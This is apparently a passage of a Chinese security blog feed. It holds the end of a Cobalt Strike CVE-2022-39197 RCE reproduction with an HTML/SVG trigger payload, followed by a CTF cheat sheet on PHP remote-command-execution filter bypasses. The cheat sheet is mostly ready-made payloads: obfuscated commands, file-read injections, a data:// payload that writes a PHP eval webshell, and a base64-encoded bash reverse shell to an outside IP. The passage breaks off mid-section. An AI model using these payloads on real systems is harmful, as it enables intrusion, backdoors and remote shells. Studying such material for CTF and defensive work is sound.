class="hljs-name">configuration</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                 <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">addDefaultImplementationEntries</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addDefaultImplementationEntries</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">addDefaultSpecificationEntries</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addDefaultSpecificationEntries</span>&gt;</span><br>                 <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                 <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br>                     <span class="hljs-tag">&lt;<span class="hljs-name">SVG-Handler-Class</span>&gt;</span>$&#123;spring.svg&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">SVG-Handler-Class</span>&gt;</span><br>                 <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br>             <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br></code></pre></td></tr></table></figure><p>首先编译代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mvn clean install -DskipTests<br></code></pre></td></tr></table></figure><p>将代码编译好之后，来到target&#x2F;classes目录下，将Manifest，编译好的包一起打包进1.jar，命令是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jar cmf Manifest 5.jar org<br></code></pre></td></tr></table></figure><p>这里Mainfest文件不知道为什么就是打包不进去，后来就直接通过pom来添加键值对了：</p><p><a href="https://blog.csdn.net/kanyun123/article/details/113057783">https://blog.csdn.net/kanyun123/article/details/113057783</a></p><p>或者直接手动修改：</p><img src="/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221019153039339.png" class="" title="image-20221019153039339"><p>开一个http，然后CS beacon处打上note触发漏洞：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;org.apache.batik.swing.JSVGCanvas&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;URI&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;http://127.0.0.1:8000/1.svg&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20221019154525962.png" class="" title="image-20221019154525962"><p>演示：</p><p><video id="video" controls="" preload="none" > <source id="mp4" src="https://spr1n9t1me.github.io/2022/10/18/CVE-2022-39197%20CS%20RCE分析复现/CS_RCE.mp4" type="video/mp4"> </video></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>CS反制</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-php中的RceBypass</title>
    <link href="/2022/09/12/ctf-php%E4%B8%AD%E7%9A%84RceBypass/"/>
    <url>/2022/09/12/ctf-php%E4%B8%AD%E7%9A%84RceBypass/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>TODO:<a href="https://www.viewofthai.link/2022/12/18/php-rce-%e5%a7%bf%e5%8a%bf-%e6%80%bb%e7%bb%93/">https://www.viewofthai.link/2022/12/18/php-rce-%e5%a7%bf%e5%8a%bf-%e6%80%bb%e7%bb%93/</a></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span></span><br>反引号`` 同<span class="hljs-built_in">shell_exec</span>() <br></code></pre></td></tr></table></figure><h3 id="管道符与元字符"><a href="#管道符与元字符" class="headerlink" title="管道符与元字符"></a>管道符与元字符</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">CR</span>：回车键&lt;ennter&gt;<br>=：设定变量<br><span class="hljs-variable">$：</span>作变量或运算替换<br>&gt;：重定向标准输入<br>&lt;：重定向标准输出<br>[<span class="hljs-symbol">:alnum</span><span class="hljs-symbol">:</span>]任意数字或者字母<br>[<span class="hljs-symbol">:alpha</span><span class="hljs-symbol">:</span>]任意字母<br>[<span class="hljs-symbol">:space</span><span class="hljs-symbol">:</span>]空格<br>[<span class="hljs-symbol">:lower</span><span class="hljs-symbol">:</span>]小写字母<br>[<span class="hljs-symbol">:digit</span><span class="hljs-symbol">:</span>]任意数字<br>[<span class="hljs-symbol">:upper</span><span class="hljs-symbol">:</span>]任意大写字母<br>[<span class="hljs-symbol">:cntrl</span><span class="hljs-symbol">:</span>]控制符<br>[<span class="hljs-symbol">:graph</span><span class="hljs-symbol">:</span>]图形<br>[<span class="hljs-symbol">:print</span><span class="hljs-symbol">:</span>]可打印字符<br>[<span class="hljs-symbol">:punct</span><span class="hljs-symbol">:</span>]标点符号<br>[<span class="hljs-symbol">:xdigit</span><span class="hljs-symbol">:</span>]十六进制数<br>[<span class="hljs-symbol">:blank</span><span class="hljs-symbol">:</span>]空白字符<br><br>&#124;：命令管道<br>&amp;：重导向文件描述符，或将命令静默执行  <span class="hljs-comment">#例如 java -jar test.jar&amp;代表后台运行</span><br>&#124;&#124;：前面的命令执行错误就执行后面的语句，否则只执行前面的语句<br>&amp;&amp;：前面的命令执行正确就执行后面的语句，否则只执行前面的语句<br>;：忽略前一个命令的返回值，继续执行下一条指令<br></code></pre></td></tr></table></figure><h3 id="空格的替换"><a href="#空格的替换" class="headerlink" title="空格的替换"></a>空格的替换</h3><h4 id="常规替换"><a href="#常规替换" class="headerlink" title="常规替换"></a>常规替换</h4><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;<br>&lt;&gt;<br>$IFS<br>$&#123;IFS&#125;<br>$IFS$(<span class="hljs-number">1</span><span class="hljs-number">-9</span>)  #从<span class="hljs-number">1</span>到<span class="hljs-number">9</span>，可以进行fuzz<br>&#123;cat,flag.txt&#125; <span class="hljs-comment">//花括号连接执行</span><br>%09<br>%20<br></code></pre></td></tr></table></figure><h4 id="u的妙用"><a href="#u的妙用" class="headerlink" title="$u的妙用"></a>$u的妙用</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-variable">$u</span>在Linux中代表的是空字符串(未初始化变量)，并不是代表是空格，我们可以将其随意插入到命令中，比如<br>c<span class="hljs-variable">$&#123;u&#125;</span>at index<span class="hljs-variable">$u</span>.php<span class="hljs-variable">$u</span><br>c`<span class="hljs-variable">$u</span>`at index<span class="hljs-variable">$u</span>.php<span class="hljs-variable">$u</span><br></code></pre></td></tr></table></figure><h4 id="命令提示符-绕过"><a href="#命令提示符-绕过" class="headerlink" title="命令提示符$绕过"></a>命令提示符$绕过</h4> <figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$*</span>、<span class="hljs-variable">$@</span>、<span class="hljs-variable">$x</span>（x=<span class="hljs-number">1</span>~<span class="hljs-number">9</span>）、<span class="hljs-variable">$&#123;</span>x&#125;（x&gt;<span class="hljs-number">9</span>)<br>在没有传参时，这些值都为空（<span class="hljs-variable">$0</span>表示shell本身的文件名，不可用）<br>例如：<br>ca<span class="hljs-variable">$*</span>t flag<br>ca<span class="hljs-variable">$@</span>t flag<br>ca<span class="hljs-variable">$7t</span> flag<br>ca<span class="hljs-variable">$&#123;</span><span class="hljs-number">18</span>&#125;t flag <br></code></pre></td></tr></table></figure><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stata">?：匹配一个字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>??<br><br><span class="hljs-comment">*：匹配一个或多个任意字符#cat fl*</span><br><br>[<span class="hljs-keyword">list</span>]：匹配<span class="hljs-keyword">list</span>内的任意单个字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>[a]<span class="hljs-keyword">g</span>   例如[@-[]可以表示大写字母<br><br>[!<span class="hljs-keyword">list</span>] or [ ^<span class="hljs-keyword">list</span>]：匹配<span class="hljs-keyword">list</span>外的任意单个字符#<span class="hljs-keyword">cat</span> fla[s]<br><br>&#123;s1,s2,s3,...&#125;：匹配s1，s2，s3或者其它更多字符#<span class="hljs-keyword">cat</span> <span class="hljs-keyword">fl</span>&#123;a,b&#125;<span class="hljs-keyword">g</span><br><br><br><span class="hljs-comment">//用通配符匹配tmp目录下的临时session文件</span><br><span class="hljs-keyword">file</span>=/???/????????[@-[]<br></code></pre></td></tr></table></figure><h3 id="可插入字符"><a href="#可插入字符" class="headerlink" title="可插入字符"></a>可插入字符</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mel">l&lt;s<br>l&lt;&gt;s<br>ca<span class="hljs-string">&quot;&quot;</span>t<br>ca<span class="hljs-string">&#x27;&#x27;</span>t<br>ca<span class="hljs-string">``</span>t<br>ca\t<br>a=c;b=at;$a$b xxx.php    # 变量拼接<br>c$&#123;u&#125;at                  # 因为c$uat 系统不知道你要执行的是$u还是$uat，因此加上界定符，命令成功运行<br>l<span class="hljs-string">`$u`</span>s<br>wh$1oami<br>who$@ami<br>whoa$*mi<br></code></pre></td></tr></table></figure><h3 id="bash读取文件命令"><a href="#bash读取文件命令" class="headerlink" title="bash读取文件命令"></a>bash读取文件命令</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sqf">cat <span class="hljs-built_in">flag</span><span class="hljs-comment">// 正序输出所有内容</span><br>tac <span class="hljs-built_in">flag</span><span class="hljs-comment">// 从最后一行开始倒序输出所有内容</span><br>php <span class="hljs-built_in">flag</span><span class="hljs-comment">// php读取</span><br>head <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件前若干行（需要加参数 -n）</span><br>tail <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件后若干行（需要加参数 -n）</span><br>more <span class="hljs-built_in">flag</span><span class="hljs-comment">// 按页读文件</span><br>less <span class="hljs-built_in">flag</span><span class="hljs-comment">// 好像和more差不多</span><br>nl <span class="hljs-built_in">flag</span><span class="hljs-comment">// 读文件顺便显示行号</span><br>od <span class="hljs-built_in">flag</span><span class="hljs-comment">// 一般用od -c flag</span><br>file -f <span class="hljs-built_in">flag</span><span class="hljs-comment">// 利用file报错出flag</span><br><span class="hljs-built_in">sort</span> <span class="hljs-built_in">flag</span><span class="hljs-comment">// 按首列ascii排序后输出</span><br>uniq <span class="hljs-built_in">flag</span><span class="hljs-comment">// 删除重复出现的行列</span><br>paste <span class="hljs-built_in">flag</span><span class="hljs-comment">// 合并文件的行列并输出</span><br>diff <span class="hljs-built_in">flag</span> file<span class="hljs-comment">// 对比flag和file的不同</span><br>bzmore <span class="hljs-built_in">flag</span><span class="hljs-comment">// 将bzip压缩过的文件解压后输出</span><br>bzless <span class="hljs-built_in">flag</span><span class="hljs-comment">// bzmore增强版</span><br>curl file:<span class="hljs-comment">///flag// file协议读</span><br>sed -n <span class="hljs-string">&#x27;1,2p&#x27;</span> <span class="hljs-built_in">flag</span><span class="hljs-comment">// 1，2表示显示1~2行，可以不要</span><br>strings <span class="hljs-comment">//字符串形式查看文件</span><br>grep  <span class="hljs-comment">//例如 grep test *php strings 表示查找并打印出以php为后缀的文件中包含字符串test的行</span><br></code></pre></td></tr></table></figure><h3 id="php文件读取函数"><a href="#php文件读取函数" class="headerlink" title="php文件读取函数"></a>php文件读取函数</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs mel">#通过单一函数读取文件<br>c=echo file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=readfile(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=var_dump(<span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>c=print_r(<span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>#这里做一个解释<span class="hljs-string">`file — 把整个文件读入一个数组中`</span><br>#通过<span class="hljs-keyword">fopen</span>去读取文件内容，这里介绍下函数<br><span class="hljs-keyword">fread</span>()<br>fgets()<br>fgetc()<br>fgetss()<br>fgetcsv()<br>gpassthru()<br><br>一些payload:<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgets($a);echo $line;&#125;#一行一行读取<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgetc($a);echo $line;&#125;#一个一个字符读取<br>c=$a=<span class="hljs-keyword">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-keyword">feof</span>($a)) &#123;$line = fgetcsv($a);var_dump($line);&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">payload1:c=system(<span class="hljs-string">&quot;nl fla?????&quot;</span>);<br>payload2:c=system(<span class="hljs-string">&quot;nl fla*&quot;</span>);<br>payload3:c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag.php`;    或者c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl“”ag.php`;<br>payload4:c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl\ag.php`;    <span class="hljs-comment">#转义字符绕过</span><br>payload5:c=include(<span class="hljs-variable">$_GET</span>[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php<br>payload6:c=<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_GET</span>[1]);&amp;1=system(<span class="hljs-string">&#x27;nl flag.php&#x27;</span>);<br>payload7:c=awk <span class="hljs-string">&#x27;&#123;printf $0&#125;&#x27;</span> flag.php&#124;&#124;<br></code></pre></td></tr></table></figure><h2 id="Bypass技巧"><a href="#Bypass技巧" class="headerlink" title="Bypass技巧"></a>Bypass技巧</h2><h3 id="1-bash进制转换、编码"><a href="#1-bash进制转换、编码" class="headerlink" title="1.bash进制转换、编码"></a>1.bash进制转换、编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">//16进制编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span>&#124;xxd -p   <span class="hljs-comment"># encode</span><br>63617420666c61670a<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61670a&quot;</span>&#124;xxd -r -p   <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>//8进制执行<br>$(<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;\154\163&quot;</span>)  <span class="hljs-comment">#ls</span><br><br>//base64编码、解码<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cat flag&quot;</span> &#124; <span class="hljs-built_in">base64</span>  <span class="hljs-comment"># encode</span><br>Y2F0IGZsYWcK<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWcK&quot;</span> &#124; <span class="hljs-built_in">base64</span> -d  <span class="hljs-comment"># decode</span><br><span class="hljs-built_in">cat</span> flag<br><br>`<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;Y2F0Cg==&#x27;</span> &#124; <span class="hljs-built_in">base64</span> -d` flag.txt     <span class="hljs-comment"># &quot;Y2F0Cg==&quot; 解码后是cat</span><br><br></code></pre></td></tr></table></figure><p>如果加上直接执行的话就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#16进制</span><br><span class="hljs-built_in">echo</span> &lt;hexString&gt;&#124;xxd -r -p&#124;bash<br><span class="hljs-comment">#base64</span><br><span class="hljs-built_in">echo</span> &lt;base64String&gt;&#124;<span class="hljs-built_in">base64</span> -d&#124;bash<br><span class="hljs-comment">#base64反弹shell: bash -i &gt;&amp; /dev/tcp/101.33.203.2/4444 0&gt;&amp;1</span><br>bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMzMuMjAzLjIvNDQ0NCAwPiYx&#125;&#124;&#123;<span class="hljs-built_in">base64</span>,-d&#125;&#124;&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><h3 id="2-bash内联执行"><a href="#2-bash内联执行" class="headerlink" title="2.bash内联执行"></a>2.bash内联执行</h3><p>将输出作为输入执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//$() 代表执行括号中语句的执行结果，反引号类似。</span><br><br>$(<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cat flag&#x27;</span>)<br><br>`<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cat flag&#x27;</span>`<br></code></pre></td></tr></table></figure><h3 id="3-bin目录"><a href="#3-bin目录" class="headerlink" title="3.bin目录"></a>3.bin目录</h3><p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/bin/</span>?at<span class="hljs-variable">$&#123;IFS&#125;</span>f???????  <span class="hljs-comment">#cat flag.php</span><br><span class="hljs-regexp">/bin/</span>base64<br></code></pre></td></tr></table></figure><h3 id="3-cp-mv-改文件名"><a href="#3-cp-mv-改文件名" class="headerlink" title="3.cp mv 改文件名"></a>3.cp mv 改文件名</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp fla?.php <span class="hljs-number">1</span>.txt<br>mv fla?.php <span class="hljs-number">1</span>.txt<br><span class="hljs-regexp">//</span>另外使用php函数也可以改文件名<br>c=rename(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;1.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后访问1.txt</p><h3 id="4-文件包含二次传参"><a href="#4-文件包含二次传参" class="headerlink" title="4.文件包含二次传参"></a>4.文件包含二次传参</h3><p>可以使用include、require来构造文件包含读文件。</p><p>%0a用于换行绕过，另外<strong>include可以不使用()使用?&gt;闭合。</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php //伪协议读</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">   //写文件</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== //base64写文件</span><br><span class="language-xml">c=include$_GET[1]?&gt;&amp;1=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&quot;&lt;?php eval(\$_POST[&#x27;hack&#x27;]);?&gt;&quot;</span>)<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> //写后门</span><br><span class="language-xml"></span><br><span class="language-xml">//require和include一样</span><br><span class="language-xml">c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h3 id="5-短标签"><a href="#5-短标签" class="headerlink" title="5.短标签"></a>5.短标签</h3><p>写shell bypass较常用。</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">//</span><span class="language-php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> :短标签,相当于</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> ,也可以写成</span><span class="language-php"><span class="hljs-meta">&lt;?</span> <span class="hljs-meta">?&gt;</span></span><span class="language-xml"> 例如：</span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?</span><span class="hljs-keyword">echo</span>%<span class="hljs-number">09</span>`cat%<span class="hljs-number">09</span>/flag`<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="6-无参函数绕过"><a href="#6-无参函数绕过" class="headerlink" title="6.无参函数绕过"></a>6.无参函数绕过</h3><p><a href="https://www.cnblogs.com/pursue-security/p/15406272.html">https://www.cnblogs.com/pursue-security/p/15406272.html</a></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/110840156">https://blog.csdn.net/weixin_46330722/article/details/110840156</a></p><p>有时候会遇到如下类型的过滤：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, $_GET[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>])<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>意思就是传入的函数必须是无参执行的，像phpinfo()之类。</p><p>我们绕过的思路就是利用php的一些无参函数的返回值，一层层嵌套执行。</p><h4 id="getallheaders-、end-、implode"><a href="#getallheaders-、end-、implode" class="headerlink" title="getallheaders() 、end()、implode()"></a>getallheaders() 、end()、implode()</h4><p><strong>注：此姿势仅限于apache可以使用。</strong></p><p>getallheaders()顾名思义是获取所有请求头信息，并以数组形式返回。</p><p>end()是取数组中最后一个元素值。</p><p>impode是将数组元素连接成为一个字符串。</p><p>用这三个函数我们可以<strong>提取请求头参数值来命令执行</strong>。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-comment">//请求头部最后添加 spring : phpinfo();//</span><br><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()))</span><br><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">implode</span>(<span class="hljs-title">getallheaders</span>()))</span><br></code></pre></td></tr></table></figure><h4 id="get-defined-vars-、current-、end"><a href="#get-defined-vars-、current-、end" class="headerlink" title="get_defined_vars() 、current()、end()"></a>get_defined_vars() 、current()、end()</h4><p>这种方式就更通用一些。</p><p>get_defined_vars():获取四个超全局变量GET 、POST、FILES、COOKIE，并以二维数组的形式返回。</p><p>current():可以<strong>将二位数组转换成一维数组</strong>并返回数组中的当前单元；默认是GET中的第一个。</p><p>我们可以使用end(current(get_defined_vars()))获取传递的最后一个GET参数值，然后eval执行</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">current</span>(<span class="hljs-title">get_defined_vars</span>())))&amp;<span class="hljs-variable">spring</span>=<span class="hljs-title">phpinfo</span>();</span><br><span class="hljs-function"><span class="hljs-comment">//spring的值被前面获取到并执行</span></span><br></code></pre></td></tr></table></figure><h4 id="session-id"><a href="#session-id" class="headerlink" 